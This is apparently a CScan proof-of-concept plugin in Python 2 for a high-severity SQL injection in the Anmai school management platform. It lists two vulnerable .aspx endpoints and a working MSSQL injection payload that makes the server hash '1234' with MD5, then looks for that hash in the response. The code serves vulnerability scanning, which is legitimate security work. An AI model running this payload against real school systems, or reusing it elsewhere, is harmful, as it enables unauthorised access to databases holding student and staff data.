# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Anmai_0007' # 平台漏洞编号，留空
    name = '安脉学校综合管理平台 高危SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-20'  # 漏洞公布时间
    desc = '''
        安脉学校综合管理平台2处高危SQL注入漏洞：
        "/oa/stock/applyInfo.aspx?username=1",
        "/time/shezhiSystem/SZTime.aspx?clsname=1"
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0108502
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '安脉学校综合管理平台'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '543048e0-bce8-496e-9a0a-0c1b7a7523b2'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/oa/stock/applyInfo.aspx?username=1",
                "/time/shezhiSystem/SZTime.aspx?clsname=1",
            ]
            data = "'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()